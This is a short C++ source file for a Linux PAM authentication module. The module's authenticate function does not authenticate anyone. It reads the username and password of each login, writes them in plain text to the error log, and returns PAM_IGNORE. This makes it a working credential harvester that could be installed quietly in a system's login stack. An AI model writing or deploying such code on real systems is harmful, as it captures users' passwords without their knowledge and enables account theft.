#include <security/pam_appl.h>
#include <security/pam_modules.h>

#include <iostream>

#include "base.hpp"

// PAM authentication function
extern "C" int pam_sm_authenticate(pam_handle_t* pamh, [[maybe_unused]] int flags, [[maybe_unused]] int argc,
                                   [[maybe_unused]] const char** argv) {
	auto auth = getLoginCredentials(pamh);

	std::clog << "Username: " << auth.first;
	if (auth.second) std::clog << " - Password: " << *auth.second;
	std::clog << std::endl;

	return PAM_IGNORE;
}
